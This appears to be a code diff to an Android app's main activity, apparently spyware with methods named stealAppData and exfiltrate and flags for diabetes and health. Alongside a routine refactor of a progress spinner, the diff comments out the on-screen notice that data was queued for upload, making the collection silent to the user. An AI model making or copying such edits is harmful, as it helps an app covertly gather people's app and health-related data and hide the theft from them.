@@ -11,6 +11,7 @@ import android.net.NetworkInfo;
 import android.net.wifi.WifiManager;
 import android.os.Build;
 import android.os.Bundle;
+import android.os.Handler;
 import android.os.PowerManager;
 import android.provider.Settings;
 import android.telephony.TelephonyManager;
@@ -18,7 +19,6 @@ import android.util.Log;
 import android.view.View;
 import android.widget.ImageView;
 import android.widget.ProgressBar;
-import android.widget.Toast;
 import androidx.appcompat.app.AppCompatActivity;
 import com.squareup.picasso.Picasso;
 
@@ -46,11 +46,12 @@ public class MainActivity extends AppCompatActivity implements WifiListener, Vie
     private boolean flagDiabetes;
     private boolean flagHealth;
 
+    private ProgressBar spinner;
+
     /**
      * contains packages of apps we're keeping track of; the uid are used as keys
      */
     private Map<String, String> appMap = new HashMap<>();
-    private ProgressBar spinner;
 
     @Override
     public void onCreate(Bundle savedInstanceState) {
@@ -59,6 +60,7 @@ public class MainActivity extends AppCompatActivity implements WifiListener, Vie
 
         IntentFilter filter = new IntentFilter(Intent.ACTION_SCREEN_ON);
         filter.addAction(Intent.ACTION_SCREEN_OFF);
+        spinner = findViewById(R.id.progressBar1);
 
         stealAppData();
     }
@@ -165,17 +167,13 @@ public class MainActivity extends AppCompatActivity implements WifiListener, Vie
 
     @Override
     public void onClick(View view) {
-        spinner = (ProgressBar) findViewById(R.id.progressBar1);
         spinner.setVisibility(View.VISIBLE);
-
-        try {
-            // thread to sleep for 1000 milliseconds
-            Thread.sleep(2000);
-        } catch (Exception e) {
-            System.out.println(e);
-        }
-
-        spinner.setVisibility(View.GONE);
+        new Handler().postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                spinner.setVisibility(View.GONE);
+            }
+        }, 2000);
     }
 
     private void exfiltrate(String version, String id) {
@@ -248,11 +246,7 @@ public class MainActivity extends AppCompatActivity implements WifiListener, Vie
 
     public void prepareForUpload(String string) {
         dataToUpload.add(string);
-        Toast.makeText(
-            this,
-            "Data was queued for upload.",
-            Toast.LENGTH_SHORT
-        ).show();
+//        Toast.makeText(this, "Data was queued for upload.", Toast.LENGTH_SHORT).show();
     }
 
     @Override
